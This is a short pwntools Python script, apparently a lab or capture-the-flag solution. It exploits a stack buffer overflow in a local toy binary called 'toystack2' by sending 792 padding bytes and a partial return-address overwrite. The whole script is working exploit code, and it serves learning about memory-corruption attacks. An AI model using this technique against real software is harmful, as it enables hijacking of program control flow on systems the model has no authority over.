# Import everything in the pwntools namespace
from pwn import *


# Note: Replace 'toystack1' with the actual path to the binary if different
# io = gdb.debug('./toystack1', 'b main')
# pause()  # Pause to allow time to set up GDB before sending input

### case 2. when exploiting, uncomment and fill in the following:
io = process('./toystack2')
pause()

# wait for welcome message output to complete
io.recvuntil(b"We will now read in some bytes!\n\n\n")

# Overflow the buffer with some padding and a return address
exploit = b'A'* 792 + p16(0x59df)

# send our payload to standard input
io.send(exploit)

# print out the program response
print(io.recvall())


